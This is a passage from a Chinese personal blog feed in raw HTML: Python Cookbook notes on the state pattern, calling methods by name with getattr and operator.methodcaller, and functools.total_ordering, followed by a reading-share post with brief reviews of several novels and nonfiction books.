class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Connection</span>:</span></span><br><span class="line">    <span class="string">"""普通方案，好多个判断语句，效率低下~~"""</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.state = <span class="string">'CLOSED'</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">read</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> self.state != <span class="string">'OPEN'</span>:</span><br><span class="line">            <span class="keyword">raise</span> RuntimeError(<span class="string">'Not open'</span>)</span><br><span class="line">        print(<span class="string">'reading'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">write</span><span class="params">(self, data)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> self.state != <span class="string">'OPEN'</span>:</span><br><span class="line">            <span class="keyword">raise</span> RuntimeError(<span class="string">'Not open'</span>)</span><br><span class="line">        print(<span class="string">'writing'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">open</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> self.state == <span class="string">'OPEN'</span>:</span><br><span class="line">            <span class="keyword">raise</span> RuntimeError(<span class="string">'Already open'</span>)</span><br><span class="line">        self.state = <span class="string">'OPEN'</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">close</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> self.state == <span class="string">'CLOSED'</span>:</span><br><span class="line">            <span class="keyword">raise</span> RuntimeError(<span class="string">'Already closed'</span>)</span><br><span class="line">        self.state = <span class="string">'CLOSED'</span></span><br></pre></td></tr></table></figure><p>这样写有很多缺点，首先是代码太复杂了，好多的条件判断。其次是执行效率变低， 因为一些常见的操作比如<code>read()、write()</code>每次执行前都需要执行检查。一个更好的办法是为每个状态定义一个对象：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Connection1</span>:</span></span><br><span class="line">    <span class="string">"""新方案——对每个状态定义一个类"""</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.new_state(ClosedConnectionState)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">new_state</span><span class="params">(self, newstate)</span>:</span></span><br><span class="line">        self._state = newstate</span><br><span class="line">        <span class="comment"># Delegate to the state class</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">read</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self._state.read(self)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">write</span><span class="params">(self, data)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self._state.write(self, data)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">open</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self._state.open(self)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">close</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self._state.close(self)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Connection state base class</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ConnectionState</span>:</span></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">read</span><span class="params">(conn)</span>:</span></span><br><span class="line">        <span class="keyword">raise</span> NotImplementedError()</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">write</span><span class="params">(conn, data)</span>:</span></span><br><span class="line">        <span class="keyword">raise</span> NotImplementedError()</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">open</span><span class="params">(conn)</span>:</span></span><br><span class="line">        <span class="keyword">raise</span> NotImplementedError()</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">close</span><span class="params">(conn)</span>:</span></span><br><span class="line">        <span class="keyword">raise</span> NotImplementedError()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ClosedConnectionState</span><span class="params">(ConnectionState)</span>:</span></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">read</span><span class="params">(conn)</span>:</span></span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">'Not open'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">write</span><span class="params">(conn, data)</span>:</span></span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">'Not open'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">open</span><span class="params">(conn)</span>:</span></span><br><span class="line">        conn.new_state(OpenConnectionState)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">close</span><span class="params">(conn)</span>:</span></span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">'Already closed'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OpenConnectionState</span><span class="params">(ConnectionState)</span>:</span></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">read</span><span class="params">(conn)</span>:</span></span><br><span class="line">        print(<span class="string">'reading'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">write</span><span class="params">(conn, data)</span>:</span></span><br><span class="line">        print(<span class="string">'writing'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">open</span><span class="params">(conn)</span>:</span></span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">'Already open'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">close</span><span class="params">(conn)</span>:</span></span><br><span class="line">        conn.new_state(ClosedConnectionState)</span><br></pre></td></tr></table></figure><p>使用示例如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>c = Connection()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>c._state</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> '<span class="title">__main__</span>.<span class="title">ClosedConnectionState</span>'&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; <span class="title">c</span>.<span class="title">read</span><span class="params">()</span></span></span><br><span class="line"><span class="class"><span class="title">Traceback</span> <span class="params">(most recent call last)</span>:</span></span><br><span class="line">    File <span class="string">"&lt;stdin&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    File <span class="string">"example.py"</span>, line <span class="number">10</span>, <span class="keyword">in</span> read</span><br><span class="line">        <span class="keyword">return</span> self._state.read(self)</span><br><span class="line">    File <span class="string">"example.py"</span>, line <span class="number">43</span>, <span class="keyword">in</span> read</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">'Not open'</span>)</span><br><span class="line">RuntimeError: Not open</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>c.open()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>c._state</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> '<span class="title">__main__</span>.<span class="title">OpenConnectionState</span>'&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; <span class="title">c</span>.<span class="title">read</span><span class="params">()</span></span></span><br><span class="line"><span class="class"><span class="title">reading</span></span></span><br><span class="line"><span class="class">&gt;&gt;&gt; <span class="title">c</span>.<span class="title">write</span><span class="params">(<span class="string">'hello'</span>)</span></span></span><br><span class="line"><span class="class"><span class="title">writing</span></span></span><br><span class="line"><span class="class">&gt;&gt;&gt; <span class="title">c</span>.<span class="title">close</span><span class="params">()</span></span></span><br><span class="line"><span class="class">&gt;&gt;&gt; <span class="title">c</span>.<span class="title">_state</span></span></span><br><span class="line"><span class="class">&lt;<span class="title">class</span> '<span class="title">__main__</span>.<span class="title">ClosedConnectionState</span>'&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt;</span></span><br></pre></td></tr></table></figure><h4 id="通过字符串调用对象方法"><a href="#通过字符串调用对象方法" class="headerlink" title="通过字符串调用对象方法"></a>通过字符串调用对象方法</h4><p>有一个字符串形式的方法名称，如果想通过它调用某个对象的对应方法。最简单的情况，可以使用<code>getattr()</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Point</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, x, y)</span>:</span></span><br><span class="line">        self.x = x</span><br><span class="line">        self.y = y</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__repr__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">'Point(&#123;!r:&#125;,&#123;!r:&#125;)'</span>.format(self.x, self.y)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">distance</span><span class="params">(self, x, y)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> math.hypot(self.x - x, self.y - y)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = Point(<span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line">d = getattr(p, <span class="string">'distance'</span>)(<span class="number">0</span>, <span class="number">0</span>)  <span class="comment"># Calls p.distance(0, 0)</span></span><br></pre></td></tr></table></figure><p>另外一种方法是使用<code>operator.methodcaller()</code>，示例如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> operator</span><br><span class="line">operator.methodcaller(<span class="string">'distance'</span>, <span class="number">0</span>, <span class="number">0</span>)(p)</span><br></pre></td></tr></table></figure><p>当你需要通过相同的参数多次调用某个方法时，使用<code>operator.methodcaller</code>就很方便了。 比如你需要排序一系列的点，就可以这样做：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">points = [</span><br><span class="line">    Point(<span class="number">1</span>, <span class="number">2</span>),</span><br><span class="line">    Point(<span class="number">3</span>, <span class="number">0</span>),</span><br><span class="line">    Point(<span class="number">10</span>, <span class="number">-3</span>),</span><br><span class="line">    Point(<span class="number">-5</span>, <span class="number">-7</span>),</span><br><span class="line">    Point(<span class="number">-1</span>, <span class="number">8</span>),</span><br><span class="line">    Point(<span class="number">3</span>, <span class="number">2</span>)</span><br><span class="line">]</span><br><span class="line">points.sort(key=operator.methodcaller(<span class="string">'distance'</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br></pre></td></tr></table></figure><p>调用一个方法实际上是两步独立操作，第一步是查找属性，第二步是函数调用。 因此，为了调用某个方法，你可以首先通过<code>getattr()</code>来查找到这个属性，然后再去以函数方式调用它即可。<br><code>operator.methodcaller()</code>创建一个可调用对象，并同时提供所有必要参数， 然后调用的时候只需要将实例对象传递给它即可，示例如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>p = Point(<span class="number">3</span>, <span class="number">4</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>d = operator.methodcaller(<span class="string">'distance'</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>d(p)</span><br><span class="line"><span class="number">5.0</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><h4 id="让类支持比较操作"><a href="#让类支持比较操作" class="headerlink" title="让类支持比较操作"></a>让类支持比较操作</h4><p><code>Python</code>类对每个比较操作都需要实现一个特殊方法来支持。例如为了支持<code>&gt;=</code>操作符，你需要定义一个<code>__ge__()</code>方法。装饰器<code>functools.total_ordering</code>就是用来简化这个处理的。使用它来装饰一个类，你只需定义一个<code>__eq__()</code>方法， 外加其他方法(<code>__lt__, __le__, __gt__, or __ge__</code>)中的一个即可。 然后装饰器会自动为你填充其它比较方法。示例如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> total_ordering</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Room</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, name, length, width)</span>:</span></span><br><span class="line">        self.name = name</span><br><span class="line">        self.length = length</span><br><span class="line">        self.width = width</span><br><span class="line">        self.square_feet = self.length * self.width</span><br><span class="line"></span><br><span class="line"><span class="meta">@total_ordering</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">House</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, name, style)</span>:</span></span><br><span class="line">        self.name = name</span><br><span class="line">        self.style = style</span><br><span class="line">        self.rooms = list()</span><br><span class="line"></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">living_space_footage</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> sum(r.square_feet <span class="keyword">for</span> r <span class="keyword">in</span> self.rooms)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">add_room</span><span class="params">(self, room)</span>:</span></span><br><span class="line">        self.rooms.append(room)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">'&#123;&#125;: &#123;&#125; square foot &#123;&#125;'</span>.format(self.name,</span><br><span class="line">                self.living_space_footage,</span><br><span class="line">                self.style)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__eq__</span><span class="params">(self, other)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.living_space_footage == other.living_space_footage</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__lt__</span><span class="params">(self, other)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.living_space_footage &lt; other.living_space_footage</span><br></pre></td></tr></table></figure><p>这里我们只是给<code>House</code>类定义了两个方法：<code>__eq__()</code>和<code>__lt__()</code>，它就能支持所有的比较操作：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">h1 = House(<span class="string">'h1'</span>, <span class="string">'Cape'</span>)</span><br><span class="line">h1.add_room(Room(<span class="string">'Master Bedroom'</span>, <span class="number">14</span>, <span class="number">21</span>))</span><br><span class="line">h1.add_room(Room(<span class="string">'Living Room'</span>, <span class="number">18</span>, <span class="number">20</span>))</span><br><span class="line">h1.add_room(Room(<span class="string">'Kitchen'</span>, <span class="number">12</span>, <span class="number">16</span>))</span><br><span class="line">h1.add_room(Room(<span class="string">'Office'</span>, <span class="number">12</span>, <span class="number">12</span>))</span><br><span class="line">h2 = House(<span class="string">'h2'</span>, <span class="string">'Ranch'</span>)</span><br><span class="line">h2.add_room(Room(<span class="string">'Master Bedroom'</span>, <span class="number">14</span>, <span class="number">21</span>))</span><br><span class="line">h2.add_room(Room(<span class="string">'Living Room'</span>, <span class="number">18</span>, <span class="number">20</span>))</span><br><span class="line">h2.add_room(Room(<span class="string">'Kitchen'</span>, <span class="number">12</span>, <span class="number">16</span>))</span><br><span class="line">h3 = House(<span class="string">'h3'</span>, <span class="string">'Split'</span>)</span><br><span class="line">h3.add_room(Room(<span class="string">'Master Bedroom'</span>, <span class="number">14</span>, <span class="number">21</span>))</span><br><span class="line">h3.add_room(Room(<span class="string">'Living Room'</span>, <span class="number">18</span>, <span class="number">20</span>))</span><br><span class="line">h3.add_room(Room(<span class="string">'Office'</span>, <span class="number">12</span>, <span class="number">16</span>))</span><br><span class="line">h3.add_room(Room(<span class="string">'Kitchen'</span>, <span class="number">15</span>, <span class="number">17</span>))</span><br><span class="line">houses = [h1, h2, h3]</span><br><span class="line">print(<span class="string">'Is h1 bigger than h2?'</span>, h1 &gt; h2) <span class="comment"># prints True</span></span><br><span class="line">print(<span class="string">'Is h2 smaller than h3?'</span>, h2 &lt; h3) <span class="comment"># prints True</span></span><br><span class="line">print(<span class="string">'Is h2 greater than or equal to h1?'</span>, h2 &gt;= h1) <span class="comment"># Prints False</span></span><br><span class="line">print(<span class="string">'Which one is biggest?'</span>, max(houses)) <span class="comment"># Prints 'h3: 1101-square-foot Split'</span></span><br><span class="line">print(<span class="string">'Which is smallest?'</span>, min(houses)) <span class="comment"># Prints 'h2: 846-square-foot Ranch'</span></span><br></pre></td></tr></table></figure><p><code>total_ordering</code>装饰器也没那么神秘。它就是定义了一个从每个比较支持方法到所有需要定义的其他方法的一个映射而已。比如你定义了<code>__le__()</code>方法，那么它就被用来构建所有其他的需要定义的那些特殊方法。 实际上就是在类里面像下面这样定义了一些特殊方法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">House</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__eq__</span><span class="params">(self, other)</span>:</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__lt__</span><span class="params">(self, other)</span>:</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="comment"># Methods created by @total_ordering</span></span><br><span class="line">    __le__ = <span class="keyword">lambda</span> self, other: self &lt; other <span class="keyword">or</span> self == other</span><br><span class="line">    __gt__ = <span class="keyword">lambda</span> self, other: <span class="keyword">not</span> (self &lt; other <span class="keyword">or</span> self == other)</span><br><span class="line">    __ge__ = <span class="keyword">lambda</span> self, other: <span class="keyword">not</span> (self &lt; other)</span><br><span class="line">    __ne__ = <span class="keyword">lambda</span> self, other: <span class="keyword">not</span> self == other</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;在&lt;code&gt;python cookbook&lt;/code&gt;中学到的很多&lt;code&gt;python&lt;/code&gt;技巧，基本都是工作中做&lt;code
      
    
    </summary>
    
    
      <category term="Python" scheme="elssm.github.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>读书分享V</title>
    <link href="elssm.github.io/2023/08/27/%E8%AF%BB%E4%B9%A6%E5%88%86%E4%BA%ABV/"/>
    <id>elssm.github.io/2023/08/27/读书分享V/</id>
    <published>2023-08-27T11:27:54.000Z</published>
    <updated>2023-10-09T12:47:08.446Z</updated>
    
    <content type="html"><![CDATA[<h4 id="月亮与六便士"><a href="#月亮与六便士" class="headerlink" title="月亮与六便士"></a>月亮与六便士</h4><p><img src="/2023/08/27/读书分享V/1.jpg" alt="1" style="zoom:70%;"></p><p><strong>满地都是六便士，他却抬头看见了月亮。</strong></p><p>银行家查尔斯，人到中年，事业有成，为了追求内心隐秘的绘画梦想，突然抛妻别子，弃家出走。他深知：人的每一种身份都是一种自我绑架，唯有失去是通向自由之途。在异国他乡，他贫病交加，对梦想却愈发坚定执着。他说：我必须画画，就像溺水的人必须挣扎。在经历种种离奇遭遇后，他来到南太平洋的一座孤岛，同当地一位姑娘结婚生子，成功创作出一系列惊世杰作。就在此时，他被绝症和双目失明击倒，临死之前，他做出了让所有人震惊的决定……人世漫长得转瞬即逝，有人见尘埃，有人见星辰。查尔斯就是那个终其一生在追逐星辰的人。</p><p>该说不说，毛姆手下的主人公都挺牛逼的。。。。查尔斯有拉里内味了</p><h4 id="夏洛的网"><a href="#夏洛的网" class="headerlink" title="夏洛的网"></a>夏洛的网</h4><p><img src="/2023/08/27/读书分享V/2.jpg" alt="2" style="zoom:80%;"></p><p><strong>微光透进一扇小窗子，星星一颗接一颗消失</strong></p><p>一个蜘蛛和小猪的故事，写给孩子，也写给大人。在朱克曼家的谷仓里，快乐地生活着一群动物，其中小猪威尔伯和蜘蛛夏洛建立了最真挚的友谊。然而，一个最丑恶的消息打破了谷仓的平静：威尔伯未来的命运竟是成为熏肉火腿。作为一只猪，悲痛绝望的威尔伯似乎只能接受任人宰割的命运了，然而，看似渺小的夏洛却说：“我救你。”于是，夏洛用自己的丝在猪栏上织出了被人类视为奇迹的网上文字，彻底逆转了威尔伯的命运，终于让它在集市的大赛中赢得特别奖，和一个安享天命的未来。但，这时，蜘蛛夏洛的生命却走到了尽头……</p><p>看这本书的时候，夏洛脑子里一直脑补的是沈腾。。。</p><h4 id="手机"><a href="#手机" class="headerlink" title="手机"></a>手机</h4><p><img src="/2023/08/27/读书分享V/3.jpg" alt="3" style="zoom:80%;"></p><p><strong>世界上只有不学的人，没有学不会的事</strong></p><p>《手机》是一部关于人们日常“说话”的小说。据作者统计，人从早上睁开眼睛，到晚上闭上眼睛，要说三千多句话。如果有人夜里说梦话，还得再加上三十多句。在这部小说中有许多嘴，有人不爱说话，有人在说假话，有人在说傻话，有人在说实话，有人是话中有话。主人公严守一是一个以“说话”为生的人，在电视台主持节目。他的节目以说真话见长，但在日常生活中，他不由自主开始说谎话。当谎话和手机连在一起时，手机就变成了手雷。</p><p>刘震云的书就是耐看～～～</p><h4 id="认知觉醒"><a href="#认知觉醒" class="headerlink" title="认知觉醒"></a>认知觉醒</h4><p><img src="/2023/08/27/读书分享V/4.jpg" alt="4" style="zoom:80%;"></p><p><strong>耐心不是毅力带来的结果，而是具有长远目光的结果</strong></p><p>这是一部可以穿透时间的个人成长方法论。通过“大脑构造、潜意识、元认知”等思维规律，你将真正看清自己；通过“深度学习、关联、反馈”事物规律，你将洞悉如何真正成事！如果对自己不了解，我们就会被人的原始天性束缚，这往往会让我们感到很痛苦。然而，如果了解大脑知识，我们就可以观察并指导自己，运用认知的力量去克服天性，从而获得长久而清晰的内在动力，让我们告别绝大多数人生痛苦。</p><p>干货挺多，就是现在忘的也差不多了。</p><h4 id="红色的起点：中国共产党诞生纪实"><a href="#红色的起点：中国共产党诞生纪实" class="headerlink" title="红色的起点：中国共产党诞生纪实"></a>红色的起点：中国共产党诞生纪实</h4><p><img src="/2023/08/27/读书分享V/5.jpg" alt="5"></p><p><strong>星星之火，可以燎原</strong></p><p>中国共产党从起初只有50多名党员，发展到如今拥有8000多万党员的执政党，深度影响了近代中国的历史进程。中国共产党当初是怎样诞生的，成为一个众所关注的话题。本书作者叶永烈以“地利优势”，在上海作了长时间细致的采访，又专程赴北京及嘉兴南湖访问，历经十余年考证，以客观的文字，创新的“T”字型叙事结构，娓娓讲述中国共产党诞生的艰辛与辉煌……</p><p>这本书让我对南陈北李有了更深的了解，中国共产党的成立是艰辛的，我们要珍惜这来之不易的生活！</p><h4 id="蛤蟆先生去看心理医生"><a href="#蛤蟆先生去看心理医生" class="headerlink" title="蛤蟆先生去看心理医生"></a>蛤蟆先生去看心理医生</h4><p><img src="/2023/08/27/读书分享V/6.jpg" alt="6" style="zoom:80%;"></p><p><strong>人们太容易让重要的事件就这么过去，忘记关注或为它们庆祝，也许是因为我们通常都只在事后才明白它们有多重要</strong></p><p>蛤蟆先生一向爱笑爱闹，如今却一反常态地郁郁寡欢，他一个人躲在屋里，连起床梳洗的力气都没有。朋友们非常担心他，建议他去做心理咨询。在10次心理咨询中，蛤蟆在咨询师苍鹭的带领下，勇敢地探索了自己的内心世界，也逐渐找回了信心与希望……这并不是一本写给孩子看的书，而是一本非常有深度的心理疗愈读物。出版20多年来，已成为英国国民级心理咨询入门书。它基于TA沟通分析心理学的理论，讲述了一个抑郁症病人通过十次心理咨询，终于找回快乐和自信的全过程。在书中，可以看到心理咨询的倾听、共情、沟通技巧，也可以看到一个标准的心理咨询流程的模板。读者犹如亲临现场，体验心理咨询的每一个细节，见证疗愈和改变的发生。</p><p>荣格说：没有一种觉醒是不带着痛苦的。</p><h4 id="红楼梦"><a href="#红楼梦" class="headerlink" title="红楼梦"></a>红楼梦</h4><p><img src="/2023/08/27/读书分享V/7.jpg" alt="7" 